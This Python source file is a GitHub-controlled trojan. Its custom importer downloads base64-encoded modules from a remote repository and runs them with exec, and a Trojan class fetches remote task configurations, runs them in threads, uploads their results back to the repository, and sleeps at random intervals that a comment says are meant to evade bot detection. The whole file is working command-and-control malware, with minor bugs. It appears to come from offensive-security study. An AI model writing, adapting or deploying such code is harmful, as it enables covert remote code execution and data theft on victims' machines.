import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime

def github_connect():                                               #Reads from token file to connect to repository
    with open('mytoken.txt') as f:
        token = f.read()
    user = 'blacklistedx'
    sess = github3.login(token=token)
    return sess.repository(user, 'blacklistedx')

def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content   #Take in dir contents of a module and return the output       

class GitImporter:                          
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print("[*] Attempting to retrieve %s" % name)
        self.repo = github_connect()

        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self

    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None,           #Loads Git Importer module 
                                               origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)         #Defining custom import
        sys.modules[spec.name] = new_module
        return new_module                   #Hence new module


class Trojan:                               #Building json data file from id and creating its own direcotry
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()


    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)      #Github actually spits out base64 encoding data hence the base64 decode line
        config = json.loads(base64.b64decode(config_json))                      #Retrieve remote confirguration from repository

        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])                              #Imports module and runs it as python code (if user controllabel you can acheuve RCE
            return config

    def module_runner(self, module):                            #Sets multi-threaded config
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self,id}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(remote_path, message, base64.b64encode(bindata))

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(
                        target=self.module_runner,
                        args=(task['module'],))
                thread.start()
                time.sleep(random.randint(1, 10))

            time.sleep(random.randint(30*60, 30*60*60)) # Randon time intervals to avoid bot detection


if __name__ == '__main__':
    sys.meta_path.append(GitImporter())     #If not able to run, check git import class
    trojan = Trojan('abc')                  #Enables the trojan instance
    trojan.run()




